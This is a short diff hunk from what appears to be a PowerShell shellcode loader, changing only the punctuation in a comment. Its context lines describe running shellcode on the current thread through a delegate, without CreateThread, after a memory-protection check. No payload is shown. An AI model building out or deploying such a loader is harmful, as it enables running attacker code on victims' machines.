@@ -93,7 +93,7 @@ if (-not $ProtectResult) {
     exit 1
 }
 
-# Create delegate type and invoke — no CreateThread needed
+# Create delegate type and invoke - no CreateThread needed
 # This executes the shellcode on the current thread
 $DelegateType = [System.Runtime.InteropServices.Marshal].GetType().Assembly.GetType(
     'System.Runtime.InteropServices.Marshal'
